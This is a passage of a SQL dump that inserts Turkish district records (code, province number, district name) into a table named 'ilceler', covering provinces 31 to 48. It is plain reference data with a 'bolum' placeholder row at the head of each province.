INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '379', '31', 'Hassa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '380', '31', 'Iskenderun' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '381', '31', 'Kirikhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '382', '31', 'Kumlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '383', '31', 'Reyhanli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '384', '31', 'Samandagi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '385', '31', 'Yayladagi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '386', '32', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '387', '32', 'Aksu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '388', '32', 'Atabey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '389', '32', 'Egirdir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '390', '32', 'Gelendost' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '391', '32', 'Gönen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '392', '32', 'Keçiborlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '393', '32', 'Senirkent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '394', '32', 'Sütçüler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '395', '32', 'Sarkikaraag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '396', '32', 'Uluborlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '397', '32', 'Yenisarbade' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '398', '32', 'Yalvaç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '399', '33', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '400', '33', 'Anamur' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '401', '33', 'Aydincik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '402', '33', 'Bozyazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '403', '33', 'Çamliyayla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '404', '33', 'Erdemli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '405', '33', 'Gülnar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '406', '33', 'Mut' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '407', '33', 'Silifke' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '408', '33', 'Tarsus' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '409', '34', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '410', '34', 'Adalar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '411', '34', 'Avcilar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '412', '34', 'Bagcilar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '413', '34', 'Bakirköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '414', '34', 'Bahçelievle' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '415', '34', 'Bayrampasa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '416', '34', 'Besiktas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '417', '34', 'Beykoz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '418', '34', 'Beyoglu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '419', '34', 'Büyükçekmece' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '420', '34', 'Çatalca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '421', '34', 'Eminönü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '422', '34', 'Eyüp' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '423', '34', 'Esenler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '424', '34', 'Fatih' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '425', '34', 'Gaziosmanpasa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '426', '34', 'Güngören' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '427', '34', 'Kadiköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '428', '34', 'Kagithane' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '429', '34', 'Kartal' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '430', '34', 'Küçükçekmece' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '431', '34', 'Maltepe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '432', '34', 'Pendik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '433', '34', 'Sariyer' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '434', '34', 'Silivri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '435', '34', 'Sultanbeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '436', '34', 'Sile' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '437', '34', 'Sisli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '438', '34', 'Tuzla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '439', '34', 'Ümraniye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '440', '34', 'Üsküdar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '441', '34', 'Yalova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '442', '34', 'Zeytinburnu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '443', '35', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '444', '35', 'Aliaga' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '445', '35', 'Bayindir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '446', '35', 'Balçova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '447', '35', 'Bergama' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '448', '35', 'Beydag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '449', '35', 'Bornova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '450', '35', 'Buca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '451', '35', 'Çesme' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '452', '35', 'Çigli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '453', '35', 'Dikili' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '454', '35', 'Foça' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '455', '35', 'Gaziemir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '456', '35', 'Güzelbahçe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '457', '35', 'Karaburun' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '458', '35', 'Karsiyaka' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '459', '35', 'Kemalpasa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '460', '35', 'Kinik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '461', '35', 'Kiraz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '462', '35', 'Konak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '463', '35', 'Menderes' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '464', '35', 'Menemen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '465', '35', 'Narlidere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '466', '35', 'Ödemis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '467', '35', 'Seferihisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '468', '35', 'Selçuk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '469', '35', 'Tire' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '470', '35', 'Torbali' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '471', '35', 'Urla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '472', '36', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '473', '36', 'Akyaka' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '474', '36', 'Arpaçay' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '475', '36', 'Digor' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '476', '36', 'Kagizman' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '477', '36', 'Sarikamis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '478', '36', 'Selim' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '479', '36', 'Susuz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '480', '37', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '481', '37', 'Abana' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '482', '37', 'Agli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '483', '37', 'Araç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '484', '37', 'Azdavay' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '485', '37', 'Bozkurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '486', '37', 'Cide' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '487', '37', 'Çatalzeytin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '488', '37', 'Daday' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '489', '37', 'Devrekani' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '490', '37', 'Doganyurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '491', '37', 'Hanönü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '492', '37', 'Ihsangazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '493', '37', 'Inebolu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '494', '37', 'Küre' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '495', '37', 'Pinarbasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '496', '37', 'Seydiler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '497', '37', 'Senpazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '498', '37', 'Tasköprü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '499', '37', 'Tosya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '500', '38', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '501', '38', 'Akkisla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '502', '38', 'Bünyan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '503', '38', 'Develi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '504', '38', 'Felahiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '505', '38', 'Hacilar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '506', '38', 'Incesu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '507', '38', 'Kocasinan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '508', '38', 'Melikgazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '509', '38', 'Özvatan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '510', '38', 'Pinarbasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '511', '38', 'Sarioglan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '512', '38', 'Sariz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '513', '38', 'Talas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '514', '38', 'Tomarza' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '515', '38', 'Yahyali' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '516', '38', 'Yesilhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '517', '39', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '518', '39', 'Babaeski' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '519', '39', 'Demirköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '520', '39', 'Kofçaz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '521', '39', 'Lüleburgaz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '522', '39', 'Pehlivanköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '523', '39', 'Pinarhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '524', '39', 'Vize' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '525', '40', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '526', '40', 'Akçakent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '527', '40', 'Akpinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '528', '40', 'Boztepe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '529', '40', 'Çiçekdagi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '530', '40', 'Kaman' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '531', '40', 'Mucur' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '532', '41', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '533', '41', 'Darica' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '534', '41', 'Gebze' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '535', '41', 'Gölcük' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '536', '41', 'Kandira' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '537', '41', 'Karamürsel' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '538', '41', 'Körfez' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '539', '42', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '540', '42', 'Ahirli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '541', '42', 'Akören' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '542', '42', 'Aksehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '543', '42', 'Altinekin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '544', '42', 'Beysehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '545', '42', 'Bozkir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '546', '42', 'Derebucak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '547', '42', 'Cihanbeyli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '548', '42', 'Çumra' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '549', '42', 'Çeltik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '550', '42', 'Derbent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '551', '42', 'Doganhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '552', '42', 'Emirgazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '553', '42', 'Eregli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '554', '42', 'Güneysinir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '555', '42', 'Halkapinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '556', '42', 'Hadim' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '557', '42', 'Hüyük' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '558', '42', 'Ilgin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '559', '42', 'Kadinhani' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '560', '42', 'Karapinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '561', '42', 'Karatay' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '562', '42', 'Kulu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '563', '42', 'Meram' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '564', '42', 'Sarayönü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '565', '42', 'Selçuklu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '566', '42', 'Seydisehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '567', '42', 'Taskent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '568', '42', 'Tuzlukçu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '569', '42', 'Yalihöyük' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '570', '42', 'Yunak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '571', '43', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '572', '43', 'Altintas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '573', '43', 'Aslanapa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '574', '43', 'Cavdarhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '575', '43', 'Domaniç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '576', '43', 'Dumlupinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '577', '43', 'Emet' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '578', '43', 'Gediz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '579', '43', 'Hisarcik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '580', '43', 'Pazarlar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '581', '43', 'Simav' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '582', '43', 'Saphane' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '583', '43', 'Tavsanli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '584', '44', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '585', '44', 'Akçadag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '586', '44', 'Arapgir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '587', '44', 'Arguvan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '588', '44', 'Battalgazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '589', '44', 'Darende' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '590', '44', 'Dogansehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '591', '44', 'Doganyol' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '592', '44', 'Hekimhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '593', '44', 'Kale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '594', '44', 'Kuluncak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '595', '44', 'Pötürge' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '596', '44', 'Yazihan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '597', '44', 'Yesilyurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '598', '45', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '599', '45', 'Ahmetli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '600', '45', 'Akhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '601', '45', 'Alasehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '602', '45', 'Demirci' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '603', '45', 'Gölmarmara' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '604', '45', 'Gördes' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '605', '45', 'Kirkagaç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '606', '45', 'Köprübasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '607', '45', 'Kula' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '608', '45', 'Salihli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '609', '45', 'Sarigöl' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '610', '45', 'Saruhanli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '611', '45', 'Selendi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '612', '45', 'Soma' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '613', '45', 'Turgutlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '614', '46', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '615', '46', 'Afsin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '616', '46', 'Andirin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '617', '46', 'Çaglayancer' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '618', '46', 'Ekinözü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '619', '46', 'Elbistan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '620', '46', 'Göksun' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '621', '46', 'Nurhak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '622', '46', 'Pazarcik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '623', '46', 'Türkoglu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '624', '47', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '625', '47', 'Dargeçit' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '626', '47', 'Derik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '627', '47', 'Kiziltepe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '628', '47', 'Mazidagi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '629', '47', 'Midyat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '630', '47', 'Nusaybin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '631', '47', 'Ömerli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '632', '47', 'Savur' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '633', '47', 'Yesilli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '634', '48', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '635', '48', 'Bodrum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '636', '48', 'Dalaman' );
